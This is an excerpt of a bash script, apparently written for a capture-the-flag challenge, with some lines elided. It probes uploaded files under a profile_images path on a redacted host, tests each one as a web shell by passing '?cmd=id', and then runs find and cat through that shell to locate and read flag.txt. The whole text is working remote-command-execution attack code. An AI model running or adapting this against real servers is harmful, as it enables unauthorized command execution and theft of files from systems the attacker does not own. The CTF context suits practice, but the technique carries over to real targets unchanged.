...
while IFS= read -r line; do
    ...
    status=$(curl -s -o /dev/null -w "%{http_code}" "http://redacted/profile_images/$line")
    
    if [ "$status" -eq 200 ]; then
        echo "[+] Found accessible file: $line" | tee -a "$output_file"
        
        # Test for command execution
        exec_test=$(curl -s "http://redacted/profile_images/$line?cmd=id")
        if [[ "$exec_test" == *"uid="* ]]; then
            echo "[!] COMMAND EXECUTION WORKING!" | tee -a "$output_file"
            
            # Search for flag
            echo "[*] Searching for flag.txt..." | tee -a "$output_file"
            flag_locations=$(curl -s "http://redaced/profile_images/$line?cmd=find / -type f -name flag.txt 2>/dev/null")
            ...
            if [ -n "$flag_locations" ]; then
                ...
                flag_content=$(curl -s "http://redacted/profile_images/$line?cmd=cat $(echo $first_flag | sed 's/ /\\ /g')")
